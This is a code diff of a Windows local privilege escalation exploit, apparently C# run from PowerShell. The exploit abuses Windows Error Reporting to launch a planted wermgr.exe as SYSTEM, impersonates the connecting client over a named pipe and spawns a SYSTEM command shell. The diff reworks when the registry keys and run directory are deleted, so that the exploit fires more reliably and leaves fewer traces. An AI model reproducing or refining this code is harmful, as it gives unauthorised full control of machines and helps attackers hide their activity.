@@ -275,11 +275,8 @@ if($r-eq 0){
             {UseShellExecute=false,CreateNoWindow=true};
         using(var p=System.Diagnostics.Process.Start(psi)) p.WaitForExit(3000);
 
-        /* Only clean registry now; leave runDir alive until WER executes wermgr.exe */
-        Thread.Sleep(500);
-        try{RecDelete(CF);}catch{}
-        try{RecDelete(TK);}catch{}
-        Console.WriteLine("[+] Registry cleaned, waiting for WER to fire...");
+        /* Leave EVERYTHING intact - WER needs the fake windir in VE to find our wermgr.exe */
+        Console.WriteLine("[+] WER triggered, waiting for SYSTEM...");
         return true;
     }
 
@@ -664,6 +661,8 @@ if($r-eq 0){
         if (!escPipe.WaitForConnectionAsync().Wait(25000)) {
             Console.WriteLine("[-] Timed out waiting for SYSTEM");
             escPipe.Dispose();
+            try{RecDelete(CF);}catch{}
+            try{RecDelete(TK);}catch{}
             try{Directory.Delete(runDir,true);}catch{}
             return;
         }
@@ -674,6 +673,8 @@ if($r-eq 0){
         if (!ImpersonateNamedPipeClient(escPipe.SafePipeHandle.DangerousGetHandle())) {
             Console.WriteLine($"[-] ImpersonateNamedPipeClient failed: {Marshal.GetLastWin32Error()}");
             escPipe.Dispose();
+            try{RecDelete(CF);}catch{}
+            try{RecDelete(TK);}catch{}
             try{Directory.Delete(runDir,true);}catch{}
             return;
         }
@@ -692,8 +693,10 @@ if($r-eq 0){
         try { escPipe.Write(new byte[]{1}, 0, 1); escPipe.Flush(); } catch {}
         escPipe.Dispose();
 
-        /* Clean up runDir now that wermgr.exe has been launched */
+        /* Clean up everything now that SYSTEM has connected and been launched */
         Thread.Sleep(500);
+        try{RecDelete(CF);}catch{}
+        try{RecDelete(TK);}catch{}
         try{Directory.Delete(runDir,true);}catch{}
 
         /* Spawn SYSTEM cmd in this console */
